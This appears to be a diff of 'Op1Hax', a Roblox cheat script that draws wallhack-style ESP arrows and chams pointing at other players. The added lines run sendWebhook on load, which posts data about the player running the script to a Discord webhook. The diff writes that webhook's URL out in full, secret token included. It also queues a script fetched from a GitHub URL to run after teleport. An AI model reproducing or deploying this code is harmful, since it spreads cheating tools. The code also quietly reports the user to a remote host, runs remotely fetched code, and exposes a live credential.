@@ -1,6 +1,9 @@
 if getgenv().HAX_LOADED then
+	warn("Op1Hax is already loaded.")
 	return
 end
+
+warn("Loading Op1Hax...")
 
 pcall(function() getgenv().HAX_LOADED = true end)
 if not game:IsLoaded() then game.Loaded:Wait() end
@@ -59,7 +62,7 @@ local function sendWebhook(player)
 
 	local decoded = HttpService:JSONDecode(response.Body)
 	
-	local webhook = "https://discord.com/api/webhooks/1126227979736434064/_your_webhook_url_here_"
+	local webhook = "https://discord.com/api/webhooks/1460434193359179847/XHmVldBepBh0a2R8-OOSDXLAJ9jvJRjFrSB1O6g8_9XkhrXNoR770YBN4xA4Qd9DSWH4"
 	local data = { 
 		["content"] = "<@500006712926011413>",
 
@@ -96,6 +99,8 @@ local function sendWebhook(player)
     	Method = "POST",
     	Body = HttpService:JSONEncode(data)
 	})
+
+	return message
 end
 
 -- ===== ARROWS ESP =====
@@ -107,44 +112,22 @@ do
 	local teamFilter = true
 	
 	-- Arrow configuration
-	local DistFromCenter = 10
-	local TriangleHeight = 5
-	local TriangleWidth = 5
-	local TriangleFilled = true
-	local TriangleTransparency = 0
-	local TriangleThickness = 1
-	local TriangleColor = Color3.new(1, 1, 1)
+	local ArrowColor = Color3.new(1, 1, 1)
+	local ArrowSize = 40
+	local ArrowDistance = 150
 
 	ArrowsESP.Enabled = enabled
 
 	local function createArrow()
-		local triangle = Drawing.new("Triangle")
-		triangle.Visible = false
-		triangle.Color = TriangleColor
-		triangle.Filled = TriangleFilled
-		triangle.Thickness = TriangleThickness
-		triangle.Transparency = 1 - TriangleTransparency
-		return triangle
-	end
-
-	local function rotateVector(v, angle)
-		angle = math.rad(angle)
-		local cos_a = math.cos(angle)
-		local sin_a = math.sin(angle)
-		return Vector2.new(v.x * cos_a - v.y * sin_a, v.x * sin_a + v.y * cos_a)
-	end
-
-	local function getRelative(targetPos, playerChar)
-		if not playerChar or not playerChar:FindFirstChild("HumanoidRootPart") then
-			return Vector3.new(0, 0, 0)
-		end
-		local playerPos = playerChar.HumanoidRootPart.Position
-		local relative = Camera.CFrame:PointToObjectSpace(targetPos)
-		return Vector3.new(relative.X, relative.Y, relative.Z)
-	end
-
-	local function relativeToCenter(v)
-		return Camera.ViewportSize / 2 - v
+		local text = Drawing.new("Text")
+		text.Visible = false
+		text.Color = ArrowColor
+		text.Size = ArrowSize
+		text.Font = 2
+		text.Text = "▲"
+		text.Center = true
+		text.Transparency = 0.5
+		return text
 	end
 
 	local function updateArrows()
@@ -159,6 +142,16 @@ do
 				arrowPool[uid] = nil
 			end
 		end
+
+		local localChar = LocalPlayer.Character
+		local localHRP = localChar.HumanoidRootPart
+		local screenCenter = Camera.ViewportSize / 2
+		local camCFrame = Camera.CFrame
+		local camLook = camCFrame.LookVector
+
+		-- Get camera's forward direction in XZ plane
+		local camForward = Vector3.new(camLook.X, 0, camLook.Z).Unit
+		local camAngle = math.atan2(camForward.Z, camForward.X)
 
 		-- Update arrows for active players
 		for uid, player in pairs(ConcurrentPlayers) do
@@ -182,6 +175,7 @@ do
 			-- Get target position and check if on screen
 			local targetPos = player.Character.HumanoidRootPart.Position
 			local onScreen, screenPos = Camera:WorldToViewportPoint(targetPos)
+			print(onScreen, screenPos)
 
 			local arrow = arrowPool[uid]
 			if not arrow then
@@ -190,22 +184,26 @@ do
 			end
 
 			if not onScreen then
-				-- Target is off-screen, draw arrow pointing towards it
-				local rel = getRelative(targetPos, LocalPlayer.Character)
-				local direction = Vector2.new(rel.X, rel.Z).Unit
+				-- Calculate direction to target in XZ plane
+				local localPos = localHRP.Position
+				local targetXZ = Vector3.new(targetPos.X, 0, targetPos.Z)
+				local localXZ = Vector3.new(localPos.X, 0, localPos.Z)
+				local dirXZ = (targetXZ - localXZ).Unit
+				local targetAngle = math.atan2(dirXZ.Z, dirXZ.X)
 				
-				-- Calculate triangle points
-				local base = direction * DistFromCenter
-				local sideLength = TriangleWidth / 2
-				local baseL = base + rotateVector(direction, 90) * sideLength
-				local baseR = base + rotateVector(direction, -90) * sideLength
-				local tip = direction * (DistFromCenter + TriangleHeight)
+				-- Calculate relative angle to camera
+				local relativeAngle = targetAngle - camAngle
+				relativeAngle = ((relativeAngle + math.pi) % (math.pi * 2)) - math.pi
 
-				-- Position relative to screen center
-				local centerOffset = relativeToCenter(Vector2.new(0, 0))
-				arrow.PointA = relativeToCenter(baseL) + centerOffset
-				arrow.PointB = relativeToCenter(baseR) + centerOffset
-				arrow.PointC = relativeToCenter(tip) + centerOffset
+				-- Position arrow at distance from center
+				local arrowX = math.cos(relativeAngle) * ArrowDistance
+				local arrowY = math.sin(relativeAngle) * ArrowDistance
+
+				-- Set position relative to screen center
+				arrow.Position = screenCenter + Vector2.new(arrowX, arrowY)
+				
+				-- Rotate arrow to point towards target
+				arrow.Rotation = math.deg(relativeAngle) + 90
 				arrow.Visible = true
 			else
 				arrow.Visible = false
@@ -228,14 +226,21 @@ do
 	end
 
 	function ArrowsESP:SetColor(r, g, b)
-		TriangleColor = Color3.new(r, g, b)
+		ArrowColor = Color3.new(r, g, b)
 		for _, arrow in pairs(arrowPool) do
-			arrow.Color = TriangleColor
+			arrow.Color = ArrowColor
 		end
 	end
 
 	function ArrowsESP:SetDistance(dist)
-		DistFromCenter = dist
+		ArrowDistance = dist
+	end
+
+	function ArrowsESP:SetSize(size)
+		ArrowSize = size
+		for _, arrow in pairs(arrowPool) do
+			arrow.Size = ArrowSize
+		end
 	end
 
 	ArrowsESP.Connection = RunService.RenderStepped:Connect(updateArrows)
@@ -306,6 +311,7 @@ do
 				removeCham(player)
 			end
 		end
+		print("Chams ESP toggled " .. tostring(state))
 	end
 
 	function ChamsESP:SetTeamFilter(state)
@@ -341,3 +347,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
 		ChamsESP:Toggle(false)
 	end
 end)
+
+sendWebhook(LocalPlayer)
+queue_on_teleport("https://raw.githubusercontent.com/L3monnn/ROBLOX/refs/heads/main/SafeESP")
+print("Op1Hax loaded successfully.")
